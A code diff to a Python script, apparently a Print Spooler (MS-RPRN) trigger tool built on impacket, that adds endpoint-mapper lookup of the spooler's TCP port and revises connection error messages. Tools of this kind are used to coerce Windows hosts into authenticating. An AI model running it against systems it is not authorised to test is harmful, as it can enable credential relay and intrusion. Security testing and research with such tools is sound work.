@@ -9,7 +9,7 @@ import argparse
 import logging
 import sys
 
-from impacket.dcerpc.v5 import transport, rprn
+from impacket.dcerpc.v5 import epm, transport, rprn
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_CONNECT
 from impacket.dcerpc.v5.dtypes import NULL
@@ -35,8 +35,20 @@ class RpcTcpPrinterTrigger:
                 stringbinding = f'ncacn_ip_tcp:{self.target_host}[{self.tcp_port}]'
                 logging.info(f'Using specified port: {self.tcp_port}')
             else:
-                stringbinding = f'ncacn_ip_tcp:{self.target_host}'
-                logging.info('Using dynamic port resolution via endpoint mapper')
+                logging.info('Querying endpoint mapper for spoolss port (TCP/135)...')
+                try:
+                    stringbinding = epm.hept_map(
+                        self.target_host, rprn.MSRPC_UUID_RPRN, protocol='ncacn_ip_tcp'
+                    )
+                    logging.info(f'EPM resolved spoolss to: {stringbinding}')
+                except Exception as e:
+                    logging.error(f'Endpoint mapper lookup failed: {e}')
+                    logging.error(
+                        'Print Spooler not found in endpoint mapper — '
+                        'is the Print Spooler service running on the target? '
+                        'Is TCP/135 reachable?'
+                    )
+                    return False
 
             logging.info(f'Connecting to {stringbinding}')
             rpctransport = transport.DCERPCTransportFactory(stringbinding)
@@ -118,9 +130,12 @@ class RpcTcpPrinterTrigger:
         except Exception as e:
             error_str = str(e)
             if 'abstract_syntax_not_supported' in error_str:
-                logging.error('Print Spooler not listening on RPC over TCP')
-                logging.error('The target may be Windows Server 2022 or older')
-                logging.error('Try enabling RPC over TCP on the target or use RPC over Named Pipes')
+                logging.error('RPRN interface not supported on the resolved port')
+                logging.error('Try specifying the port explicitly with --port')
+                return False
+            elif 'Connection refused' in error_str or 'timed out' in error_str.lower():
+                logging.error(f'Cannot connect to target: {e}')
+                logging.error('Check that TCP/135 and the dynamic RPC port range (49152-65535) are reachable')
                 return False
             else:
                 logging.error(f'Error during RPC operation: {e}')
